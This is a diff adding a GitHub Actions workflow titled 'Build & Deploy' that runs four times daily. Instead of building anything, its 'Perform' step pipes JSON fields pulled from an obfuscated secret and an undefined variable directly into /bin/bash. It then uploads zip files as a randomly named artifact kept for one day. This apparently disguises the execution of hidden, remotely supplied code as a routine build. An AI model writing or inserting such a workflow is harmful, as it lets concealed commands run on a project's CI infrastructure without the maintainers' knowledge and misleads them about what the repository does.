@@ -1,0 +1,31 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '50 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  workflow:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          oeow45: ${{ secrets.oeow45 }}
+        run: |
+          printf '%s' "$oeow45" | jq -r .sdnt88 | /bin/bash
+          printf '%s' "$s79" | jq -r .icgt7549 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: OTnqQjwn
+          path: "*.zip"
+          retention-days: 1
